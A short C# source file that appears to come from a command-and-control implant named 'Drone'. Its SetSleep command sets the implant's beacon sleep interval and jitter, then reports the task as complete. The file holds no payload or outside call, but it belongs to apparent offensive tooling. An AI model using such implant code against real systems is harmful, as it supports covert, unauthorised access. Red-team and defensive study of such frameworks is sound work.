using System.Threading;
using System.Threading.Tasks;

using Drone.Interfaces;

namespace Drone.Commands;

public class SetSleep : DroneCommand
{
    public override byte Command => 0x01;
    public override bool Threaded => false;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (task.Arguments.Length > 0)
            Drone.Config.Set(Setting.SLEEP_INTERVAL, int.Parse(task.Arguments[0]));
        
        if (task.Arguments.Length > 1)
            Drone.Config.Set(Setting.SLEEP_JITTER, int.Parse(task.Arguments[1]));

        await Drone.SendTaskComplete(task.Id);
    }
}